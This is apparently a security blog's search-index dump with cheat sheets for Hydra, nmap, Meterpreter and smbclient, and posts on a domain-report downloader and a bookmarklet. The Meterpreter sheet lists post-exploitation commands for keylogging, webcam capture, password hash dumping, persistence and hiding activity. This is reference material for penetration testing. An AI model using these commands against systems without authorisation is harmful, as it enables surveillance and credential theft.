\u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target port.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-f\u003c/code\u003e\u003c/strong\u003e: Stop brute-forcing after finding valid credentials.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Restore a previous session.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t \u0026lt;number\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Set the number of threads to use.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-V\u003c/code\u003e\u003c/strong\u003e: Enable verbose mode.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"supported-protocols\"\u003eSupported Protocols\u003c/h2\u003e\n\u003cp\u003eHydra supports numerous protocols, including:\u003c/p\u003e","title":"Hydra"},{"content":"Basic Syntax nmap \u0026lt;target IP\u0026gt; nmap -sT -sS -Pn -v 10.10.10.10 sudo nmap -A -sS -Pn 10.10.10.10 sudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10 Common Flags Scan Types -sT: Perform a TCP connect scan. -sU: Perform a UDP scan. -sS: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;). -Pn: Skip pinging the target. -sn: Host discovery without scanning ports. -A: Enable aggressive scan options. Advanced Features -p \u0026lt;PORT\u0026gt;: Scan specific ports. -p-: Scan all 65,535 ports. -sV: Detect services and versions running on the target. -O: Detect the operating system. -v****, -vv, ********-vvv: Set verbosity levels. --script vuln: Run vulnerability scripts. --script vulners: Use vulners scripts for CVE-based scanning. --script=http-enum: Act like Nikto to enumerate HTTP resources. Output Formats -oN: Normal text output, best for human-readable logs during manual reviews. -oX: XML output, ideal for automated tools or integrations that require structured data. ``: Greppable output, useful for scripting and quickly filtering resulst with tools like grep. -oA: Generate all three formats at once, providing maximum flexibility for further analysis or reporting. SMB Scripts Enumerate Security Mode nmap -p445 --script smb-security-mode 192.168.1.1 Enumerate Sessions nmap -p445 --script smb-enum-sessions 192.168.1.1 nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares nmap -p445 --script smb-enum-shares 192.168.1.1 nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares with Listing Listing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\nnmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Users nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Stats nmap -p445 --script smb-enum-stats --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Domains nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Groups nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=password 192.168.1.1 SSH Scripts Enumerate Algorithms nmap 192.168.1.1 -p 22 --script ssh2-enum-algos Enumerate Host Keys nmap 192.168.1.1 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full Enumerate Authentication Methods nmap 192.168.1.1 -p 22 --script ssh-auth-methods --script-args=\u0026#34;ssh.user=admin\u0026#34; ","permalink":"http://localhost:1313/cheat-sheets/nmap/","summary":"\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap \u0026lt;target IP\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sT -sS -Pn -v 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -A -sS -Pn 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003ch3 id=\"scan-types\"\u003eScan Types\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sT\u003c/code\u003e\u003c/strong\u003e: Perform a TCP connect scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sU\u003c/code\u003e\u003c/strong\u003e: Perform a UDP scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sS\u003c/code\u003e\u003c/strong\u003e: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-Pn\u003c/code\u003e\u003c/strong\u003e: Skip pinging the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sn\u003c/code\u003e\u003c/strong\u003e: Host discovery without scanning ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-A\u003c/code\u003e\u003c/strong\u003e: Enable aggressive scan options.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"advanced-features\"\u003eAdvanced Features\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Scan specific ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p-\u003c/code\u003e\u003c/strong\u003e: Scan all 65,535 ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sV\u003c/code\u003e\u003c/strong\u003e: Detect services and versions running on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-O\u003c/code\u003e\u003c/strong\u003e: Detect the operating system.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****, \u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003ccode\u003e-vv\u003c/code\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e, ****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003ccode\u003e-vvv\u003c/code\u003e\u003c/strong\u003e: Set verbosity levels.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vuln\u003c/code\u003e\u003c/strong\u003e: Run vulnerability scripts.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vulners\u003c/code\u003e\u003c/strong\u003e: Use vulners scripts for CVE-based scanning.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script=http-enum\u003c/code\u003e\u003c/strong\u003e: Act like Nikto to enumerate HTTP resources.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"output-formats\"\u003eOutput Formats\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oN\u003c/code\u003e\u003c/strong\u003e: Normal text output, best for human-readable logs during manual reviews.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oX\u003c/code\u003e\u003c/strong\u003e: XML output, ideal for automated tools or integrations that require structured data.\u003c/li\u003e\n\u003cli\u003e``: Greppable output, useful for scripting and quickly filtering resulst with tools like \u003ccode\u003egrep\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oA\u003c/code\u003e\u003c/strong\u003e: Generate all three formats at once, providing maximum flexibility for further analysis or reporting.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"smb-scripts\"\u003eSMB Scripts\u003c/h2\u003e\n\u003ch3 id=\"enumerate-security-mode\"\u003eEnumerate Security Mode\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-security-mode 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-sessions\"\u003eEnumerate Sessions\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares\"\u003eEnumerate Shares\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares-with-listing\"\u003eEnumerate Shares with Listing\u003c/h3\u003e\n\u003cp\u003eListing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\u003c/p\u003e","title":"nmap"},{"content":"Daily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where RedFlagger comes in. This lightweight Bash script automates the process of downloading and aggregating reports from Red Flag Domains. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\nThe Backstory This project started as a bit of a joke. My friend lil-doudou had written an excellent Python tool called NewRedflag to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\nWhat Does RedFlagger Do? RedFlagger streamlines the process of collecting domain reports. Instead of manually navigating the Red Flag Domains website and downloading reports one by one, you can use RedFlagger to:\nFetch the latest report. Download reports from a specific range of dates. Aggregate all available reports into one file for easier analysis. It’s a no-frills script that prioritizes functionality and flexibility.\nHow Does It Work? RedFlagger fetches reports directly from the Red Flag Domains website by parsing the daily directory. It uses simple Bash commands like curl to download files and aggregates them into a single output file for easy handling. If you’re running a quick analysis or building a dataset for long-term research, this script has you covered.\nKey Features: Custom Date Ranges: Specify a range of days to download only the reports you need. All-Inclusive Downloads: Grab every report available with a single command. Custom Output Files: Aggregate data into a file of your choice instead of dealing with multiple separate files. Why Use RedFlagger? RedFlagger is built for simplicity and speed. It doesn’t aim to replace more advanced tools but instead provides a lightweight option for users who need quick, automated access to domain reports. If you find yourself regularly pulling data from Red Flag Domains, RedFlagger can:\nSave time by automating the download process. Ensure reports are organized and aggregated for easier analysis. Provide flexible options for handling specific dates or all available data. Whether you’re an analyst tracking malicious domains or a researcher building a threat intelligence dataset, RedFlagger can fit seamlessly into your workflow.\nGetting Started Installation RedFlagger is a standalone Bash script, so there’s no complicated setup. Here’s how to get started:\nDownload the script:\ngit clone https://github.com/noobosaurus-r3x/redflagger cd redflagger chmod +x redflagger.sh Make sure curl is installed on your system:\nsudo apt install curl Usage The script provides several options to customize your downloads. Here’s the basic syntax:\n./redflagger.sh [--latest|--days num] [--all] [--output filename] Options --latest or -l: Downloads the report from 1 day ago. --days num or -d num: Downloads the report from num days ago. --all or -a: Downloads all available reports. --output filename or -o filename: Specifies the output file to store the downloaded reports. Defaults to output.txt if no filename is provided. Examples Here are a few practical ways to use RedFlagger:\nDownload the latest report:\n./redflagger.sh -l Download all reports available since 3 days ago:\n./redflagger.sh -d 3 -a -o my_file.txt Download a specific day’s report:\n./redflagger.sh -d 5 -o report_5days_ago.txt Download all reports into a custom file:\n./redflagger.sh -a -o all_reports.txt Limitations and Room for Improvement RedFlagger is intentionally simple, but it’s not without its limitations. Here are a few areas where it could be expanded or improved:\nError Handling: While the script includes basic error checks, it could provide more detailed feedback when something goes wrong (e.g., network issues or missing reports). Parallel Downloads: Adding support for downloading multiple reports simultaneously could speed up large fetches. Advanced Filtering: Options for filtering by domain type or metadata could make the tool even more powerful. If you’re interested in extending RedFlagger, feel free to fork it and make it your own.\nFinal Thoughts RedFlagger is a small, straightforward tool designed to make life easier for anyone working with Red Flag Domains. It doesn’t try to do everything but focuses on doing one thing well: fetching and aggregating domain reports quickly and efficiently.\nWhether you’re doing threat research, building datasets, or just exploring the domain data available, RedFlagger is a lightweight addition to your toolbox. And let’s not forget—it’s also a fun jab at my friend’s Python-first approach. If you’ve got ideas for improvements or run into any issues, don’t hesitate to reach out or fork the project. Happy aggregating!\n","permalink":"http://localhost:1313/tools/redflagger/","summary":"\u003cp\u003eDaily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where \u003cstrong\u003eRedFlagger\u003c/strong\u003e comes in. This lightweight Bash script automates the process of downloading and aggregating reports from \u003ca href=\"https://dl.red.flag.domains/daily/\"\u003eRed Flag Domains\u003c/a\u003e. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\u003c/p\u003e\n\u003ch2 id=\"the-backstory\"\u003eThe Backstory\u003c/h2\u003e\n\u003cp\u003eThis project started as a bit of a joke. My friend \u003cstrong\u003elil-doudou\u003c/strong\u003e had written an excellent Python tool called \u003ca href=\"https://github.com/lil-doudou/NewRedflag\"\u003eNewRedflag\u003c/a\u003e to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\u003c/p\u003e","title":"redflagger"},{"content":"When you need to quickly understand the structure of a webpage, a lightweight tool can save the day. Webpage Infos Extractor is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\nWhy Build This? Sometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\nWhat Does It Do? Once activated, the bookmarklet scans the current webpage and extracts:\nForms: Shows details like form actions, methods, and input elements.\nLinks: Lists all hyperlinks found on the page.\nImages: Displays all images in an easy-to-view layout.\nWord Count: Calculates the total number of words in the page’s text content.\nThe results are neatly presented in a new browser window with clean formatting, so you can analyze everything at a glance.\nInstallation Setting it up is simple. Here’s how:\nOpen your web browser and create a new bookmark.\nEdit the bookmark’s URL field and paste the following JavaScript code:\njavascript:(function(){var forms=document.getElementsByTagName(\u0026#39;form\u0026#39;);var links=document.getElementsByTagName(\u0026#39;a\u0026#39;);var images=document.getElementsByTagName(\u0026#39;img\u0026#39;);var bodyText=document.body.innerText;var wordCount=bodyText.split(/\\s+/).filter(function(word){return word.length\u0026gt;0;}).length;var newWindow=window.open(\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;width=800,height=600\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Extracted Data\u0026lt;/title\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;style\u0026gt;body{font-family:Arial,sans-serif}table{width:100%;border-collapse:collapse;margin-bottom:20px}th,td{border:1px solid #ddd;padding:8px;text-align:left}th{background-color:#f2f2f2}tr:nth-child(even){background-color:#f9f9f9}h2{background-color:#4CAF50;color:white;padding:10px}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Forms:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;forms.length;i++){var form=forms[i];newWindow.document.write(\u0026#39;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th colspan=\u0026#34;3\u0026#34;\u0026gt;Form \u0026#39;+(i+1)+\u0026#39;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Action\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.action||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Method\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.method||\u0026#39;get\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Name\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Type\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Value\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var j=0;j\u0026lt;form.elements.length;j++){var element=form.elements[j];var value=element.value||\u0026#39;N/A\u0026#39;;if(element.type===\u0026#39;checkbox\u0026#39;||element.type===\u0026#39;radio\u0026#39;){value=element.checked?\u0026#39;on\u0026#39;:\u0026#39;off\u0026#39;}newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.name||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.type||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+value+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Links:\u0026lt;/h2\u0026gt;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Link\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;links.length;i++){newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;+links[i].href+\u0026#39;\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026#39;+links[i].href+\u0026#39;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Images:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;images.length;i++){newWindow.document.write(\u0026#39;\u0026lt;img src=\u0026#34;\u0026#39;+images[i].src+\u0026#39;\u0026#34; style=\u0026#34;max-width:100%;display:block;margin-bottom:10px;\u0026#34;\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Word Count:\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;\u0026#39;+wordCount+\u0026#39; words\u0026lt;/p\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#39;);newWindow.document.close();})(); Save the bookmark.\nThat’s it! You now have a bookmarklet ready to extract webpage info.\nHow to Use Navigate to the webpage you want to analyze.\nClick on the saved bookmarklet.\nA new window will pop up with the following details:\nForms: Lists actions, methods, and input fields.\nLinks: Displays all hyperlinks found on the page.\nImages: Previews all images on the page.\nWord Count: Shows the total word count of the page’s text content.\nWhy Use It? This tool is perfect for:\nWeb Developers: Debugging forms, analyzing links, or reviewing images for optimization.\nContent Creators: Counting words or inspecting embedded media.\nResearchers: Extracting links or analyzing page structures quickly.\nIt’s not trying to replace full-fledged tools like browser dev tools, but it’s great for quick insights without digging into a complex interface.\nLimitations This bookmarklet is lightweight and portable, but it’s not flawless. Here are a few things to keep in mind:\nBrowser Compatibility: It works on most modern browsers but may struggle with certain page structures or dynamic content.\nStatic Analysis: It doesn’t execute JavaScript-heavy elements, so it’s best suited for simpler pages.\nBasic Formatting: The output is clean but not customizable.\nFinal Thoughts The Webpage Infos Extractor isn’t revolutionary, but it’s incredibly handy. Whether you’re troubleshooting a webpage or casually analyzing content, this bookmarklet gives you the essentials at a click. Simple, portable, and effective (sometimes), that’s all you need. If you think of ways to enhance it, feel free to tweak the code and make it your own!\n","permalink":"http://localhost:1313/tools/webpage_infos_extractor/","summary":"\u003cp\u003eWhen you need to quickly understand the structure of a webpage, a lightweight tool can save the day. \u003cstrong\u003eWebpage Infos Extractor\u003c/strong\u003e is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\u003c/p\u003e\n\u003ch2 id=\"why-build-this\"\u003eWhy Build This?\u003c/h2\u003e\n\u003cp\u003eSometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\u003c/p\u003e","title":"Webpage Infos Extractor"},{"content":"Meterpreter, the post-exploitation payload for Metasploit, is your Swiss Army knife for interacting with compromised systems. It provides a suite of commands to navigate, persist, and extract information from your target.\nBasic Commands Start with the essentials to get a lay of the land:\nhelp: Display a list of available commands (your lifeline when you\u0026rsquo;re lost). sysinfo: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;). ps: List running processes. kill \u0026lt;PID\u0026gt;: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;). migrate \u0026lt;PID\u0026gt;: Move Meterpreter to a different process to stay under the radar. rev2self: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird). File System Commands For poking around the file system:\nls: List files in the current directory. cd \u0026lt;path\u0026gt;: Change to a new directory. pwd: Print the current working directory. cat \u0026lt;filename\u0026gt;: Display the contents of a file. download \u0026lt;filename\u0026gt;: Pull a file from the target to your local machine. upload \u0026lt;filename\u0026gt;: Push a file to the target system. Network Commands To scope out the network situation:\nipconfig: Display network configuration (IP addresses, gateways, etc.). route: Show the routing table. netstat: View active network connections. portfwd [add/remove]: Set up port forwarding (e.g., local port -\u0026gt; remote service). getsockname: Identify the socket name for a connection. User Management Commands Understand who you are and who else is around:\ngetuid: Display the current user ID. ps: See running processes and their owners. getprivs: List the privileges available to the current user. getsystem: Attempt to escalate privileges to SYSTEM (good luck!). Persistence Commands Stick around longer than you’re welcome:\npersistence: Enable Meterpreter persistence on the target (requires autorun setup). run \u0026lt;script\u0026gt;: Execute scripts or commands at startup. Shell Commands Take a deeper dive with shell access:\nshell: Open a command prompt on the target (sometimes, old-school is best). execute -f \u0026lt;command\u0026gt;: Run a command on the target. background: Push your current session into the background to multitask. Ctrl+Z: Suspend the current session (don’t forget to resume it later). Other Commands For the extra \u0026ldquo;James Bond\u0026rdquo; touch:\nuse \u0026lt;extension\u0026gt;: Load a Meterpreter extension (e.g., incognito, sniffer). keyscan_start: Begin logging keystrokes (capture your target’s every typo). keyscan_dump: Dump the logged keystrokes. screenshot: Capture a screenshot of the target’s desktop. webcam_list: See available webcams on the target. webcam_snap: Take a snapshot from a webcam. hashdump: Dump password hashes (everyone’s favorite). timestomp \u0026lt;file\u0026gt;: Modify the timestamps of a file (because subtlety matters). Tips and Tricks Migrate Smartly: When migrating, pick a process that’s stable (e.g., explorer.exe) and won’t raise suspicions. Background Often: Always background your session before launching new exploits—multitasking is key. Scripting is King: Use Meterpreter scripts (run \u0026lt;script\u0026gt;) to automate repetitive tasks. Final Thoughts Meterpreter is your trusty post-exploitation buddy. Use it wisely, creatively, and responsibly. Keep this cheat sheet handy for quick reference—whether you\u0026rsquo;re downloading files, snapping screenshots, or simply making your mark in the digital shadows. Happy hacking!\n","permalink":"http://localhost:1313/cheat-sheets/meterpreter/","summary":"\u003cp\u003e\u003cstrong\u003eMeterpreter\u003c/strong\u003e, the post-exploitation payload for Metasploit, is your Swiss Army knife for interacting with compromised systems. It provides a suite of commands to navigate, persist, and extract information from your target.\u003c/p\u003e\n\u003ch2 id=\"basic-commands\"\u003eBasic Commands\u003c/h2\u003e\n\u003cp\u003eStart with the essentials to get a lay of the land:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ehelp\u003c/code\u003e\u003c/strong\u003e: Display a list of available commands (your lifeline when you\u0026rsquo;re lost).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003esysinfo\u003c/code\u003e\u003c/strong\u003e: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eps\u003c/code\u003e\u003c/strong\u003e: List running processes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ekill \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003emigrate \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Move Meterpreter to a different process to stay under the radar.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003erev2self\u003c/code\u003e\u003c/strong\u003e: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"file-system-commands\"\u003eFile System Commands\u003c/h2\u003e\n\u003cp\u003eFor poking around the file system:\u003c/p\u003e","title":"Meterpreter"},{"content":"smbclient is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\nBasic Usage To connect to an SMB file share, use the following syntax:\nsmbclient //server/share [options] Replace server with the hostname or IP address of the server hosting the file share. Replace share with the name of the file share. Once connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\nCommon Options -U \u0026lt;username\u0026gt;: Specify the username to use for authentication. -W \u0026lt;workgroup\u0026gt;: Specify the domain or workgroup. -I \u0026lt;IP address\u0026gt;: Directly specify the server\u0026rsquo;s IP address. -p \u0026lt;port\u0026gt;: Specify the port (default is 445). -d \u0026lt;debug level\u0026gt;: Set the debug level for verbose output. -N: Suppress the password prompt (useful for guest accounts). Available Commands Once connected, the following commands allow you to interact with the file share:\nls: List files and directories in the current directory. cd \u0026lt;directory\u0026gt;: Change to a different directory. pwd: Print the current working directory. put \u0026lt;file\u0026gt;: Upload a file to the share. get \u0026lt;file\u0026gt;: Download a file from the share. mput \u0026lt;files\u0026gt;: Upload multiple files. mget 